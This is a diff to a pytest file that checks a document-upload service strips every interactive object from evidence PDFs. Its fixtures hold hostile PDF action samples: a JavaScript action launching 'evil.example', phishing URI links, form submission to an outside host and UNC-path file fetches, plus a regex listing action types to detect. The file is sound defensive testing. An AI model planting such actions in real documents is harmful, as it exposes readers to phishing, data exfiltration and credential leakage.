@@ -11,6 +11,7 @@ from __future__ import annotations
 
 import os
 import pickle
+import re
 import struct
 import uuid
 import zlib
@@ -487,7 +488,11 @@ def test_pdf_is_stored_as_the_pages_only_rewrite() -> None:
 def test_pdf_whose_kept_annotations_carry_actions_or_files_rejected_415(
     build: Callable[[], bytes],
 ) -> None:
-    """The rewrite keeps annotations and form widgets, so what they carry is refused instead."""
+    """A script, a program launch, an attached file or XFA is refused, never flattened away.
+
+    The rewrite keeps annotations and form widgets with what they hold; these
+    are refused before :func:`~lemely.io.evidence_files._flatten_pdf` removes them.
+    """
     with pytest.raises(UnsupportedEvidenceError) as excinfo:
         prepare_evidence(build(), filename="form.pdf")
     assert excinfo.value.status == 415
@@ -531,6 +536,272 @@ def test_pdf_rewrite_over_the_cap_rejected_413(monkeypatch: pytest.MonkeyPatch) 
         return real(data) + b"%" + b"x" * (MAX_EVIDENCE_BYTES + 1) + b"\n"
 
     monkeypatch.setattr(evidence_files, "canonical_pdf_bytes", padded)
+    with pytest.raises(EvidenceTooLargeError):
+        prepare_evidence(PDF, filename="degree.pdf")
+
+
+# ---------------------------------------------------------------------------
+# Interactive objects (T30 F30-3): the admin opens the stored PDF in a local
+# reader, so it may carry no annotation, form field, link or action at all
+# ---------------------------------------------------------------------------
+
+_CERTIFICATE_TEXT = "Degree certificate"
+
+#: ISO 32000-2 Table 201: every action type. An action dictionary names its type as ``/S``.
+_PDF_ACTION_TYPES = (
+    "GoTo",
+    "GoToR",
+    "GoToE",
+    "GoToDp",
+    "Launch",
+    "Thread",
+    "URI",
+    "Sound",
+    "Movie",
+    "Hide",
+    "Named",
+    "SubmitForm",
+    "ResetForm",
+    "ImportData",
+    "SetOCGState",
+    "Rendition",
+    "Trans",
+    "GoTo3DView",
+    "JavaScript",
+    "RichMediaExecute",
+)
+_NAME_END = r"(?![^\s()<>\[\]{}/%])"
+#: What a reader acts on, in an object as MuPDF prints it: an ``/A`` key holding an
+#: action (a dictionary or a reference to one), an additional or open action, a
+#: link target, a page's annotation list, a form, a widget, a name tree, an
+#: outline, or any action dictionary at all.
+_ACTS = re.compile(
+    r"/A\s*(?:<<|\d+\s+\d+\s+R)"
+    rf"|/(?:AA|OpenAction|URI|Annots|AcroForm|Names|Outlines){_NAME_END}"
+    r"|/Subtype\s*/Widget"
+    rf"|/S\s*/(?:{'|'.join(_PDF_ACTION_TYPES)}){_NAME_END}"
+)
+
+
+def _printed_objects(data: bytes) -> str:
+    """Every object of the PDF ``data`` as MuPDF prints it: names decoded, no stream data."""
+    doc = pymupdf.open(stream=data, filetype="pdf")  # type: ignore[no-untyped-call]
+    try:
+        return "\n".join(
+            doc.xref_object(xref, compressed=True) for xref in range(1, doc.xref_length())
+        )
+    finally:
+        doc.close()  # type: ignore[no-untyped-call]
+
+
+def _page_texts(data: bytes) -> list[str]:
+    doc = pymupdf.open(stream=data, filetype="pdf")  # type: ignore[no-untyped-call]
+    try:
+        return [page.get_text() for page in doc]
+    finally:
+        doc.close()  # type: ignore[no-untyped-call]
+
+
+def _renders(data: bytes) -> list[bytes]:
+    """Each page's pixels at 36 dpi: what a reader shows of it."""
+    doc = pymupdf.open(stream=data, filetype="pdf")  # type: ignore[no-untyped-call]
+    try:
+        return [bytes(page.get_pixmap(dpi=36).samples) for page in doc]
+    finally:
+        doc.close()  # type: ignore[no-untyped-call]
+
+
+def assert_inert_pdf(stored: bytes) -> None:
+    """Nothing in ``stored`` acts: no annotation, widget, link, form or action (API and scan)."""
+    doc = pymupdf.open(stream=stored, filetype="pdf")  # type: ignore[no-untyped-call]
+    try:
+        assert not doc.is_form_pdf
+        catalog = doc.pdf_catalog()
+        for key in ("AcroForm", "OpenAction", "AA", "Names", "Outlines", "URI"):
+            assert doc.xref_get_key(catalog, key)[0] == "null", key
+        for page in doc:
+            assert page.first_annot is None
+            assert page.first_widget is None
+            assert page.get_links() == []
+            for key in ("Annots", "AA"):
+                assert doc.xref_get_key(page.xref, key)[0] == "null", key
+    finally:
+        doc.close()  # type: ignore[no-untyped-call]
+    assert sorted({found.group(0) for found in _ACTS.finditer(_printed_objects(stored))}) == []
+
+
+def pdf_with_action(carrier: str, action: str) -> bytes:
+    """A one-page certificate, built with PyMuPDF, whose ``carrier`` holds ``action``.
+
+    ``carrier`` is ``"widget"`` (a push button: a form field, which the
+    pages-only rewrite keeps with its ``/A``), an annotation subtype the rewrite
+    keeps too (``"Screen"``, ``"RichMedia"``, ``"Square"``), or ``"names"`` (a
+    document-level ``/Names /JavaScript`` tree). ``action`` is the action
+    dictionary, as PDF source.
+    """
+    doc = pymupdf.open()  # type: ignore[no-untyped-call]
+    try:
+        page = doc.new_page()
+        page.insert_text((72, 72), _CERTIFICATE_TEXT, fontsize=14)
+        if carrier == "names":
+            doc.xref_set_key(
+                doc.pdf_catalog(), "Names", f"<</JavaScript<</Names[(run) {action}]>>>>"
+            )
+            return bytes(doc.tobytes())
+        if carrier == "widget":
+            button = pymupdf.Widget()  # type: ignore[no-untyped-call]
+            button.field_type = pymupdf.PDF_WIDGET_TYPE_BUTTON
+            button.field_name = "verify"
+            button.rect = pymupdf.Rect(72, 100, 200, 130)
+            button.button_caption = "Verify"
+            page.add_widget(button)
+            holder = int(next(page.widgets()).xref)
+        else:
+            holder = int(doc.get_new_xref())
+            doc.update_object(holder, f"<</Type/Annot/Subtype/{carrier}/Rect[72 100 200 130]>>")
+            doc.xref_set_key(page.xref, "Annots", f"[{holder} 0 R]")
+        doc.xref_set_key(holder, "A", action)
+        return bytes(doc.tobytes())
+    finally:
+        doc.close()  # type: ignore[no-untyped-call]
+
+
+def pdf_with_visible_link() -> bytes:
+    """A certificate with a verification URL printed on it and a link over the text."""
+    doc = pymupdf.open()  # type: ignore[no-untyped-call]
+    try:
+        page = doc.new_page()
+        page.insert_text((72, 72), "Verify at https://registry.example.org/c/123", fontsize=12)
+        page.insert_link(
+            {
+                "kind": pymupdf.LINK_URI,
+                "from": pymupdf.Rect(72, 60, 360, 76),
+                "uri": "https://registry.example.org/c/123",
+            }
+        )
+        return bytes(doc.tobytes())
+    finally:
+        doc.close()  # type: ignore[no-untyped-call]
+
+
+def _subset_font_pdf() -> bytes:
+    """A font named like a subset (``/AAAAAA+Helvetica``): ``/AA`` only as a whole name acts."""
+    return assemble_pdf(
+        [
+            b"<< /Type /Catalog /Pages 2 0 R >>",
+            b"<< /Type /Pages /Kids [3 0 R] /Count 1 >>",
+            b"<< /Type /Page /Parent 2 0 R /MediaBox [0 0 595 842] /Contents 4 0 R "
+            b"/Resources << /Font << /F1 5 0 R >> >> >>",
+            _CONTENT,
+            b"<< /Type /Font /Subtype /Type1 /BaseFont /AAAAAA+Helvetica >>",
+        ]
+    )
+
+
+_UNC = r"(\\\\evidence-host\\share\\cv.pdf)"
+
+#: The action types the T30 review found stored (F30-3), each where a reader acts on it.
+_ACTIONS = [
+    pytest.param(
+        "widget",
+        "<</S/SubmitForm/F<</FS/URL/F(https://collect.example/form)>>/Flags 4>>",
+        id="submit-form",
+    ),
+    pytest.param("widget", "<</S/URI/URI(https://login.example/verify)>>", id="uri-phishing"),
+    pytest.param("widget", f"<</S/GoToR/F{_UNC}/D[0/Fit]>>", id="gotor-unc-path"),
+    pytest.param("widget", "<</S/GoToE/D[0/Fit]/T<</R/C/N(cv.pdf)>>>>", id="gotoe"),
+    pytest.param(
+        "widget", r"<</S/ImportData/F(\\\\evidence-host\\share\\data.fdf)>>", id="import-data"
+    ),
+    pytest.param("Screen", "<</S/Rendition/OP 0>>", id="rendition"),
+    pytest.param("RichMedia", "<</S/RichMediaExecute/CMD<</C(play)>>>>", id="rich-media"),
+    pytest.param("widget", "<</S/ResetForm>>", id="reset-form"),
+    pytest.param("widget", "<</S/Hide/T(verify)>>", id="hide"),
+    pytest.param("Square", "<</S/URI/URI(https://login.example/verify)>>", id="markup-uri"),
+    pytest.param(
+        "names",
+        "<</S/JavaScript/JS(app.launchURL('https://evil.example');)>>",
+        id="names-javascript",
+    ),
+]
+
+
+@pytest.mark.parametrize(("carrier", "action"), _ACTIONS)
+def test_evidence_pdf_widget_actions_refused(carrier: str, action: str) -> None:
+    """No action reaches the stored PDF: widgets are flattened into the page, the rest removed.
+
+    The pages-only rewrite keeps form widgets and annotations with their ``/A``,
+    so before F30-3 each of these was stored as it came. Now the stored file has
+    no annotation, form field, link or action left (by MuPDF's API and by a scan
+    of every object), and it reads and renders as the upload did.
+    """
+    upload = pdf_with_action(carrier, action)
+    named = re.search(r"/S/(\w+)", action)
+    assert named is not None
+    action_type = named.group(1)
+    assert f"/S/{action_type}" in _printed_objects(upload)
+    if carrier != "names":  # the catalog was never carried; widgets and annotations were
+        assert f"/S/{action_type}" in _printed_objects(evidence_files.canonical_pdf_bytes(upload))
+
+    prepared = prepare_evidence(upload, filename="certificate.pdf")
+
+    assert prepared.content_type == PDF_TYPE
+    assert_inert_pdf(prepared.data)
+    assert _pages(prepared.data) == 1
+    assert _CERTIFICATE_TEXT in _page_texts(prepared.data)[0]
+    assert _page_texts(prepared.data) == _page_texts(upload)
+    assert _renders(prepared.data) == _renders(upload)
+
+
+@pytest.mark.parametrize(
+    "build",
+    [lambda: born_digital_text_pdf(pages=3), pdf_with_visible_link, _subset_font_pdf],
+    ids=["plain-pages", "benign-visible-link", "subset-font-name"],
+)
+def test_evidence_pdf_plain_and_benign_link_stay_readable(build: Callable[[], bytes]) -> None:
+    """Flattening keeps every page as it reads and renders; only the link itself goes."""
+    upload = build()
+
+    prepared = prepare_evidence(upload, filename="certificate.pdf")
+
+    assert prepared.content_type == PDF_TYPE
+    assert _pages(prepared.data) == _pages(upload)
+    assert _page_texts(prepared.data) == _page_texts(upload)
+    assert all(text.strip() for text in _page_texts(prepared.data))
+    assert _renders(prepared.data) == _renders(upload)
+    assert_inert_pdf(prepared.data)
+
+
+def test_benign_link_upload_had_a_link() -> None:
+    """Non-vacuity of the ``benign-visible-link`` case: the upload's link is a live URI."""
+    doc = pymupdf.open(stream=pdf_with_visible_link(), filetype="pdf")  # type: ignore[no-untyped-call]
+    try:
+        [link] = doc[0].get_links()
+    finally:
+        doc.close()  # type: ignore[no-untyped-call]
+    assert link["uri"] == "https://registry.example.org/c/123"
+
+
+def test_pdf_still_interactive_after_flattening_rejected_415(
+    monkeypatch: pytest.MonkeyPatch,
+) -> None:
+    """The stored bytes are scanned after flattening: whatever still acts is refused, not stored."""
+    monkeypatch.setattr(evidence_files, "_flatten_pdf", lambda pdf: pdf)
+    upload = pdf_with_action("widget", "<</S/URI/URI(https://login.example/verify)>>")
+
+    with pytest.raises(UnsupportedEvidenceError) as excinfo:
+        prepare_evidence(upload, filename="certificate.pdf")
+    assert excinfo.value.status == 415
+
+
+def test_pdf_flattened_over_the_cap_rejected_413(monkeypatch: pytest.MonkeyPatch) -> None:
+    """The cap is checked on the flattened file too, which is what is stored."""
+    real = evidence_files._flatten_pdf
+
+    def padded(pdf: bytes) -> bytes:
+        return real(pdf) + b"%" + b"x" * (MAX_EVIDENCE_BYTES + 1) + b"\n"
+
+    monkeypatch.setattr(evidence_files, "_flatten_pdf", padded)
     with pytest.raises(EvidenceTooLargeError):
         prepare_evidence(PDF, filename="degree.pdf")
 
